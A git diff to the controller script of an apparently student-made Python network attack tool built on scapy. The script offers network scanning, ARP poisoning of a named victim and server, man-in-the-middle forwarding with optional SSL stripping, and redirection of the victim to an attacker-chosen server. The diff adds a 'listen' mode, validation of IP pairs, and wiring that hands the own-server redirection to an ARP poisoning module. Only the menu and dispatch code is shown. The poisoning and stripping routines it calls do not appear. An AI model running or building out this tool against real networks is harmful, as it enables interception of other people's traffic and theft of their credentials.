@@ -13,7 +13,6 @@ attackerMac = sc.get_if_hwaddr(sc.conf.iface)
 
 
 def main():
-    sc.show_interfaces()
     while True:
         ipt = ""
         ip_range = ""
@@ -22,10 +21,10 @@ def main():
         sslStrip = ""
         ownServerIp = ""
         silent = ""
-        while (ipt != "scan" and  ipt != "arp" and ipt != "quit"):
+        while (ipt != "scan" and  ipt != "arp" and ipt != "quit" and ipt != "listen"):
             if (ipt != ""):
                 print("Invalid input, please try again")
-            ipt = input("Enter a command: Scan, ARP, quit: ").strip().lower()
+            ipt = input("Enter a command: Scan, ARP, listen, quit: ").strip().lower()
 
         if ipt == "scan":
             while (not is_cidr_range(ip_range)):
@@ -34,23 +33,33 @@ def main():
                 ip_range = input("Enter ip range in CIDR notation: ").strip().lower()
             scan(ip_range)
 
-        elif ipt == "arp":
-            while (not is_valid_ip_pair(targets)):
-                if (targets != ""):
-                    print("Invalid input, please try again")
-                targets = input("Enter 'victim ip, server ip'. Server ip can be 'none' or both can be 'none: ").strip().lower()
-            parts = [p.strip() for p in targets.split(',')]
+        elif ipt == "arp" or ipt == "listen":
+            if (ipt == "arp"):
+                while (not is_valid_ip_pair(targets)):
+                    if (targets != ""):
+                        print("Invalid input, please try again")
+                    targets = input("Enter 'victim ip, server ip'. Server ip can be 'none' or both can be 'none: ").strip().lower()
+                    parts = [p.strip() for p in targets.split(',')]
+                    victimIP = parts[0] if parts[0] != "none" else None
+                    serverIP = parts[1] if parts[1] != "none" else None
 
-            while (silent != "silent" and silent != "allout"):
-                if (silent != ""):
-                    print("Invalid input, please try again")
-                silent = input("Enter 'silent' or 'allOut': ").strip().lower()
+                while (silent != "silent" and silent != "allout"):
+                    if (silent != ""):
+                        print("Invalid input, please try again")
+                    silent = input("Enter 'silent' or 'allOut': ").strip().lower()
+            elif (ipt == "listen"):
+                while (not is_valid_full_ip_pair(targets)):
+                    if (targets != ""):
+                        print("Invalid input, please try again")
+                    targets = input("Enter 'victim ip, server ip': ").strip().lower()
+                    parts = [p.strip() for p in targets.split(',')]
+                    victimIP = parts[0] if parts[0] != "none" else None
+                    serverIP = parts[1] if parts[1] != "none" else None
 
             while (goal != "mitm" and goal != "ownserver"):
                 if (goal != ""):
                     print("Invalid input, please try again") 
                 goal = input("Enter a goal: 'mitm' or 'ownserver': ").strip().lower()
-            ownServerMac = ""
 
 
             if goal == "ownserver":
@@ -58,39 +67,26 @@ def main():
                     if (ownServerIp != ""):
                         print("Invalid input, please try again")                    
                     ownServerIp = input("Enter a ip adress to reroute victim to: ").strip().lower()
-                ownServerMac = get_mac(ownServerIp)
-                print(ownServerIp)
-                print(ownServerMac)
                     
             elif goal == "mitm":
                 while (sslStrip != "yes" and sslStrip != "no" and sslStrip != "y" and sslStrip != "n"):
                     if (sslStrip != ""):
                         print("Invalid input, please try again")                    
                     sslStrip = input("Use ssl stripping when possible: yes, no").strip().lower()
-            
-            if len(parts) == 2:
-                victimIP = parts[0] if parts[0] != "none" else None
-                serverIP = parts[1] if parts[1] != "none" else None
-                print("len part", victimIP, " server: ",serverIP)
 
-                ArpPoisen.arp_poisoning(victimIP, serverIP, silent)
+            if ipt == "arp":
+                serverMac, victimMac = ArpPoisen.arp_poisoning(victimIP, serverIP, silent)
 
-                if goal == "ownserver":
-                    forwardToExternalServer()
-                    return
-                    
-                elif goal == "mitm":
-                    print("sniffing for syn")
-                    pkt = sc.sniff(filter="tcp", stop_filter=stop_at_syn, count=0)[-1]
-                    print("found syn")
-                    if (not ArpPoisen.three_way_handshake(pkt, victimMac, victimIP, attackerMac, attackerIP, serverMac, serverIP)):
-                        continue
-                    if (sslStrip == "yes"):
-                        sslStripping.stripping(victimIP, victimMac, serverIP, serverMac, attackerIP, attackerMac)
-                    else:
-                        sslStripping.forward(victimIP, victimMac, serverIP, serverMac, attackerIP, attackerMac)
-            else:
-                print("Invalid input format. Please enter in the form: 'victim ip, server ip'")
+            if goal == "ownserver":
+                forwardToExternalServer(victimIP, ownServerIp, attackerIP)
+                return
+                
+            elif goal == "mitm":
+                if (sslStrip == "yes" or sslStrip == "y"):
+                    sslStripping.forwarding(True, victimIP, attackerIP, victimMac, serverIP, attackerMac, serverMac)
+                else:
+                    sslStripping.forwarding(False, victimIP, attackerIP, victimMac, serverIP, attackerMac, serverMac)
+
         elif ipt == "quit":
             break
         else:
@@ -129,6 +125,9 @@ def stop_at_syn(pkt):
 
 
 def is_valid_ip_pair(s):
+    parts = [part.strip() for part in s.split(",")]
+    if len(parts) != 2:
+        return False
     ip_octet = r"(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)"
     ip_pattern = rf"{ip_octet}\.{ip_octet}\.{ip_octet}\.{ip_octet}"
 
@@ -141,6 +140,20 @@ def is_valid_ip_pair(s):
         re.match(ip_none, s, re.IGNORECASE) or
         re.match(none_none, s, re.IGNORECASE)
     )
+
+
+def is_valid_full_ip_pair(s):
+    try:
+        # Split on comma and strip whitespace
+        parts = [part.strip() for part in s.split(",")]
+        if len(parts) != 2:
+            return False
+        # Check if both parts are valid IP addresses
+        ipaddress.ip_address(parts[0])
+        ipaddress.ip_address(parts[1])
+        return True
+    except ValueError:
+        return False
 
 def is_cidr_range(s):
     try:
@@ -157,8 +170,8 @@ def is_ipv4_address(s):
     except ValueError:
         return False
     
-def forwardToExternalServer():
-    return
+def forwardToExternalServer(client_ip, server_ip, attacker_ip):
+    ArpPoisen.own_server(client_ip, server_ip, attacker_ip)
 
 if __name__ == "__main__":
     main()
